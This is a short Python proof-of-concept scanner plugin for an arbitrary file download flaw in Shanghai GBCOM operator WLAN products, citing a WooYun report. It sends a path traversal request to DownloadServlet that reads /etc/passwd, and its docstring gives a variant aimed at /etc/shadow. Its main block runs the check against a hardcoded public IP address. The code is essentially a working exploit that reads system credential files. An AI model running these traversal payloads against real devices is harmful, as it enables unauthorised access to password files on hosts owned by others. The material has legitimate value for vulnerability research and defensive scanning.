#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 上海寰创运营商WLAN产品任意文件下载
refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
description:
    http://foobar/DownloadServlet?fileName=../../etc/shadow
'''

import urlparse

def assign(service, arg):
    if service == 'gbcom_wlan':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'DownloadServlet?fileName=../../etc/passwd'
    code, head, res, err, _ = curl.curl2(url)
    if code == 200 and 'root:' in res:
        security_hole('Arbitrarilly file download: '+url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('gbcom_wlan','http://110.17.174.254/')[1])